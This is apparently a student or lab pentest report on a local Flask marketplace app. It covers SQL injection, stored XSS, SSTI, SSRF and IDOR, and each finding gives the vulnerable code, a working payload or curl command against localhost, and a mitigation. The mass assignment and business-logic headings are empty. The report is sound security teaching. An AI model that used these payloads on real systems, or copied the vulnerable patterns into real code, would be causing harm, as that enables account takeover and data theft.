This is a manual Pentest report

# Report

Our Objectif to make an AI Empowered scanner to identify These Vulnerabilities

## SQL Injection

__login form__ `app.py` , the `/login` route:

```python
row = db.execute(
        "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + pw_hash + "'"
    ).fetchone()
```
Another SQL injection on `/products` route
```python
rows = db.execute(
            "SELECT * FROM products WHERE name LIKE '%" + q + "%' OR description LIKE '%" + q + "%'"
        ).fetchall()
```
!both concatenates user input directly into SQL string

### Exploit

Open the login page at `http://localhost:5000/login` and enter :
```
Username : ' OR '1'='1' --
Password : anything
```
this returns the first row (Usually the administrator user)
Not only authentication bypass but getting access as administrator

Second one :
go to `http://localhost:5000/products?q= union select ...`
this can dump the whole database tables and even lead to more impact if the query runs with elevated privileges

`http://localhost:5000/products?q= union select 1,username,password,email,role,balance,avatar_url from users--`

### Mitigation
the best solution is to use parameterized queries (or validate/sanitize user input)
so it becomes like this
```python
row = db.execute(
        "SELECT * FROM users WHERE username = ? AND password = ? ",(username,pw_hash)
    ).fetchone()
```

## Stored XSS

Saving the review of a product , the `/product/<pid>/review` route stores user input then `templates/prodct_detail.html` render it (on route `/product/<pid>`)

on `product_detail.html`
```html
<div>{{ r.body | safe }}</div>
```
### Exploit

Go to any product page `http://localhost:5000/product/1`
in the review box , type :
```html
<script>alert('cookie :' + document.cookie)</script>
```
Click post
(this is just poc , in the real exploit we send the cookie to our server)

### Mitigation

__Jinja 2__ escape `"<'>` by default but adding `| safe` tells it to not escape

adding __httponly__ attribute to the cookie , so an attacker cannot extract it through js code (even that it still can be used as phishing)

## SSTI (Server-Side Template Injection)

in the `/seller/preview-banner` route :

the user's `text` parameter gets placed directly into a jinja2 template string
So expressions like `{{}}` in the input will be evaluated server-side

```python
tpl = f"""
    <div style="background:{color};padding:2rem;border-radius:12px;text-align:center;margin:2rem 0;">
        <h1 style="color:white;margin:0;">{text}</h1>
    </div>
    """
...
return render_template_string("""...""".format(tpl))
```
### poc

```python
http://localhost:5000/seller/preview-banner?text={{7*7}}
```
displays `49` (this can lead to RCE on the server)

### Mitigation

passing user input as a variable so jinja2 treats it as data not as template code (even if the user types `{{7*7}}` it gets rendered as text)

```python
return render_template_string(
    '<h1>{{ text }}</h1>',
    text=text
)
```

## SSRF (Server Side Request Foregry)

the server making a request to a url we specify

on `/adi/check-image` route :

```python
r = requests.get(url, timeout=5)
```

### poc
Even if there is a restricted page (only admin / localhost can request it)
we can make the server (localhost) request it for us (as low privileged user)

`/internal/admin-stats` route is protected

```python
# on /internal/admin-stats route 
if not (session.get('user_id') == 1 or request.remote_addr in ("127.0.0.1", "::1")):
        return jsonify({"error": "Forbidden"}), 403

```

```bash
curl "http://localhost:5000/api/check-image?url=http://localhost:5000/internal/admin-stats"
```
We can read `app.secret_key = "SecretPassword"` from this
which can be used as a secret key for jwt token (not implemented yet) (a user can change his jwt token without corrupting the signature , change his role to admin)

### Mitigation

Simply do not request a url provided by users (or use a whitelist (blacklist can be bypassed))

## IDOR

not comparing current user session uid with uid on the path , Attacker can query other users informations

on `/user/<uid>` route
```python
@app.route("/user/<int:uid>")
def user_profile(uid):
    user_data = db.execute("SELECT * FROM users WHERE id = ?", (uid,)).fetchone()
    # no check that the logged-in user should see this
```
Same for `/order/<oid>`:

```python
order = db.execute("...WHERE o.id = ?", (oid,)).fetchone()
# no check that session user owns this order
```
### poc

Requesting other users informations `http://localhost:5000/user/.`
```bash
for i in $(seq 1 10); do
    curl -s "http://localhost:5000/user/$i"
done
```

### Mitigation

```python
@app.route("/user/<int:uid>")
@login_required # ensure user logged in 
def user_profile(uid):
	if session["user_id"] != uid:
		return "Not ur id" , 403
    user_data = db.execute("SELECT * FROM users WHERE id = ?", (uid,)).fetchone()
```


## Mass Assignment

## Business Logic

## CSRF

There is no CSRF protection mechanism (Anti csrf token should be used in sensitive endpoints) , an attacker can trick a victim entering his server that uses the victim's cookie on our marketplace to do several acts

For example : Transfer amount of money into his account or send messages to other users on his behalf and more